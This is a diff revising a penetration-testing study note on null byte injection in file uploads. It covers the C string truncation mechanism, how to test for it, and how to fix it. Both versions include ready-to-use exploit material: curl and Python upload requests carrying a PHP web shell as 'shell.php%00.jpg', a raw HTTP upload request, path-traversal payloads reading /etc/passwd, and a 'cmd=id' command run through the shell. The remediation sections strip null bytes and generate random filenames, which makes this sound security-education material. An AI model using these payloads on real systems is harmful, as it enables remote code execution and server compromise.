@@ -7,169 +7,119 @@ topic: "22.06 Null Byte Injection (file.php%00.jpg)"
 
 # 22.06 — Null Byte Injection (file.php%00.jpg)
 
-## What Is Null Byte Injection?
+## What is it?
+In many programming languages that rely on underlying C or C++ libraries (like older versions of PHP, Perl, or Ruby), strings are "null-terminated." This means that the language expects a string to end when it encounters a Null Byte character (`\x00` in hex, or `%00` URL encoded).
 
-```
-NULL BYTE: \x00 (ASCII 0, encoded as %00 in URLs)
-  
-  C STRINGS ARE NULL-TERMINATED:
-  "hello\x00world" is treated as "hello" in C!
-  The null byte terminates the string.
-  
-  ATTACK:
-  Filename: shell.php%00.jpg
-  
-  URL-decoded: shell.php\x00.jpg
-  
-  APP CHECKS: What is the extension? → .jpg → ALLOWED!
-  PHP file_get_contents/fopen etc. with C backend:
-  Treats: shell.php\x00.jpg as shell.php (stops at null)
-  SAVES AS: shell.php → executable PHP!
-  
-  RESULT:
-  Extension check sees: .jpg (passes!)
-  OS/PHP sees: shell.php (executable!)
-```
+If an application validates the extension of an uploaded file using a high-level string function, but then passes that filename to a lower-level C function to save the file to the operating system, a mismatch occurs. By injecting a null byte, an attacker can trick the validation logic into seeing a safe extension (e.g., `.jpg`), while the operating system truncates the filename early, dropping the fake extension and saving the file with a dangerous extension (e.g., `.php`).
 
----
+Think of it like handing a bouncer an ID card that says "John Doe (VIP)". The bouncer checks the "(VIP)" part and lets you in. However, the computer system inside the club only reads up to the first space, logging you in simply as "John", who happens to have admin rights. 
 
-## When This Works
-
-```
-REQUIRES:
-  1. Language/framework uses C string handling for filenames
-  2. Or: OS-level file operation truncates at null byte
-  
-  WORKED IN:
-  - PHP 5.3 and earlier (vulnerable to null byte in file functions)
-  - Various Ruby/Rails older versions
-  - Some frameworks that call C libraries
-  
-  PATCH STATUS:
-  PHP 5.3.4+ fixed this for most file functions
-  Most modern frameworks are not vulnerable
-  
-  BUT:
-  Some legacy apps still run on vulnerable PHP versions
-  Some C extensions might still be vulnerable
-  Worth testing on older/legacy systems!
-  
-  ALSO WORKS IN:
-  URL-based file access (if PHP url_fopen or curl affected)
-  Custom C extensions processing filenames
-  Applications using C/C++ file handling via FFI
+## ASCII Diagram
+```text
+[Attacker] 
+   │ 
+   │ 1. Uploads file with name: shell.php%00.jpg
+   ▼
+[Web Application (Validation Layer)]
+   │
+   │ 2. Checks filename: "shell.php\x00.jpg"
+   │ 3. Ends with ".jpg"? YES! (Validation Passes)
+   ▼
+[Operating System (C-Level File Saving)]
+   │
+   │ 4. Receives string: "shell.php\x00.jpg"
+   │ 5. Reads "shell.php"
+   │ 6. Hits \x00 (Null Byte) -> Stops reading string
+   ▼
+[File System] ─── 7. Saves file exactly as: shell.php
 ```
 
----
+## How to Find It
+- **Manual steps:**
+  1. Intercept a file upload request using Burp Suite.
+  2. Modify the `filename` parameter in the `Content-Disposition` header to include a null byte (e.g., `filename="test.php%00.jpg"`).
+  3. Note: In `multipart/form-data`, you often need to URL decode the `%00` into an actual null byte, or use Burp's Hex Editor to manually change the bytes.
+  4. Submit the request and observe the server's response.
+  5. Attempt to access the file without the `.jpg` extension (`https://target.com/uploads/test.php`). If it executes, the system is vulnerable.
 
-## Testing Null Byte Injection
+- **Tool commands with flags explained:**
+  Using Python to programmatically send a raw null byte in the multipart form:
+  ```bash
+  python3 -c "
+  import requests
+  # Send an actual \x00 byte in the filename
+  files = {'file': ('shell.php\x00.jpg', '<?php system(\$_GET[\'cmd\']); ?>', 'image/jpeg')}
+  requests.post('https://target.com/upload', files=files)
+  "
+  ```
 
-```bash
-# METHOD 1: IN BURP — MODIFY FILENAME IN MULTIPART BODY
-# Original: filename="shell.jpg"
-# Modified: filename="shell.php%00.jpg"
-# (Note: Burp handles URL encoding in the raw request)
+## How to Exploit It
+- **Step-by-step walkthrough:**
+  1. Identify an upload endpoint that restricts files based on extension.
+  2. Prepare a PHP webshell payload.
+  3. Send the upload request, changing the filename to `shell.php%00.jpg` (or inserting a raw hex `00` before the `.jpg` if using Burp Repeater).
+  4. The application logic sees `.jpg` and allows the file.
+  5. The backend file system truncates the name and saves it as `shell.php`.
+  6. Navigate to the uploaded `shell.php` to achieve Remote Code Execution (RCE).
 
-# Also try with actual null byte:
-# In Burp: right-click body → "Paste from file" or use hex editor
-# Or: search and replace "shell.jpg" with "shell.php" + hex 00 + ".jpg"
+- **Actual payloads:**
+  **Basic Null Byte Injection:**
+  ```text
+  filename="shell.php%00.jpg"
+  ```
+  **Double Extension + Null Byte:**
+  ```text
+  filename="shell.php.jpg%00.png"
+  ```
+  **Null Byte in Path Traversal:**
+  ```text
+  filename="../../../var/www/html/shell.php%00.jpg"
+  ```
 
-# METHOD 2: CURL WITH NULL BYTE:
-# URL-encode the filename:
-curl -X POST https://target.com/upload \
-  -b "session=SESSION" \
-  --form 'file=@shell.php;filename=shell.php%00.jpg;type=image/jpeg'
+- **Real HTTP request/response examples:**
+  **Upload Request (Intercepted in Burp):**
+  ```http
+  POST /upload.php HTTP/1.1
+  Host: target.com
+  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
 
-# METHOD 3: PYTHON:
-import requests
+  ------WebKitFormBoundary
+  Content-Disposition: form-data; name="avatar"; filename="shell.php%00.jpg"
+  Content-Type: image/jpeg
 
-with open('shell.php', 'rb') as f:
-    content = f.read()
+  <?php system($_GET['cmd']); ?>
+  ------WebKitFormBoundary--
+  ```
+  *(Note: You must highlight `%00` in Burp and press Ctrl+Shift+U to URL decode it to an actual null byte before sending).*
 
-files = {'file': ('shell.php\x00.jpg', content, 'image/jpeg')}
-response = requests.post('https://target.com/upload', 
-    files=files,
-    cookies={'session': 'SESSION'})
-print(response.text)
+## Real-World Example
+Null byte injections were notoriously common in PHP applications running on versions older than PHP 5.3.4. Many custom CMS platforms and image gallery scripts would validate that an uploaded file ended in `.gif` or `.jpg`. Attackers successfully compromised millions of these servers by uploading `backdoor.php\x00.gif`. Because the developers relied on PHP's `strrchr()` to find the extension, it returned `.gif`, but when `move_uploaded_file()` was called, the underlying C function truncated the file to `backdoor.php`.
 
-# STEP 4: CHECK IF FILE SAVED AS .php:
-# After upload, try accessing:
-curl "https://target.com/uploads/shell.php?cmd=id"
-# OR: check response for the saved filename
-```
+## How to Fix It
+- **Developer remediation:**
+  Modern frameworks and language versions (like PHP > 5.3.4) have patched this vulnerability by ensuring high-level file functions do not truncate at null bytes. The best defense is ensuring your language environment is up-to-date. Furthermore, you should proactively sanitize filenames by stripping out null bytes entirely, or better yet, discard the user's filename completely and generate a new random string for the filename.
 
----
-
-## Other Null Byte Contexts
-
-```
-NULL BYTE IN PATH TRAVERSAL:
-  GET /files/../../../etc/passwd%00.jpg HTTP/1.1
+- **Code snippet:**
+  **PHP (Sanitizing explicitly):**
+  ```php
+  // Strip null bytes from the filename explicitly
+  $filename = str_replace(chr(0), '', $_FILES['file']['name']);
+  ```
   
-  Application strips: .jpg extension → path = /files/../../../etc/passwd
-  C library sees: /files/../../../etc/passwd (stops at null)
-  → File read of /etc/passwd!
+  **Python (Generating a new filename):**
+  ```python
+  import uuid
   
-NULL BYTE IN SQL INJECTION:
-  Less common but: some databases have issues with null bytes in strings
-  
-NULL BYTE IN OTHER CHECKS:
-  Image dimensions check: filename.php%00.gif
-  → GIF magic bytes check passes → saves as .php (truncated at null)
-  
-  Combined with Content-Type bypass:
-  Filename: shell.php%00.jpg + Content-Type: image/jpeg
-  → Both checks bypassed!
-```
+  # Discard the user's input filename entirely
+  # User cannot inject a null byte if you don't use their filename
+  safe_filename = str(uuid.uuid4()) + '.jpg'
+  ```
 
----
-
-## Fix
-
-```
-PREVENTING NULL BYTE INJECTION:
-
-1. SANITIZE FILENAMES — REMOVE NULL BYTES:
-   # Python:
-   filename = filename.replace('\x00', '')
-   
-   # PHP:
-   $filename = str_replace(chr(0), '', $filename);
-   
-   # Or: reject files with null bytes:
-   if '\x00' in filename:
-       raise ValueError("Invalid filename")
-
-2. USE LANGUAGE-NATIVE STRING HANDLING:
-   In PHP 5.3.4+: file functions no longer truncate at null
-   Ensure PHP version is up to date!
-   
-   # PHP check:
-   if (strpos($filename, chr(0)) !== false) {
-       die("Null byte detected in filename!");
-   }
-
-3. GENERATE NEW FILENAME INSTEAD:
-   BEST PRACTICE: Never use user-provided filename!
-   Generate: UUID + extension (extension from allowlist, not from input)
-   
-   import uuid
-   safe_filename = str(uuid.uuid4()) + '.jpg'
-   # → User filename is completely ignored!
-   # → Null bytes in original filename don't matter!
-
-4. VALIDATE EXTENSION AFTER CLEANUP:
-   # After sanitizing filename:
-   clean_name = sanitize(filename)
-   ext = Path(clean_name).suffix.lower()
-   if ext not in ALLOWED_EXTENSIONS:
-       reject()
-```
-
----
+## Chaining Opportunities
+- This vuln + [[07 - File Upload + Path Traversal]] → Attackers often use null bytes to terminate path traversal payloads when the backend appends a mandatory extension. Example: `../../../../etc/passwd%00` truncates an appended `.jpg` in legacy file-read functions.
+- This vuln + [[12 - Image Upload Magic Bytes Bypass]] → Combine a null byte filename (`shell.php%00.jpg`) with valid JPEG Magic Bytes in the file body (`FF D8 FF E0`) to bypass both extension filters and MIME/content validation simultaneously.
 
 ## Related Notes
-- [[04 - Extension Bypass (.php5, .phtml, .phar, .shtml)]] — alternative extensions
-- [[05 - Double Extension (file.php.jpg)]] — double extension trick
-- [[07 - File Upload + Path Traversal]] — null byte in path traversal context
-- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]] — full fix
+- [[04 - Extension Bypass (.php5, .phtml, .phar, .shtml)]]
+- [[05 - Double Extension (file.php.jpg)]]
+- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]]
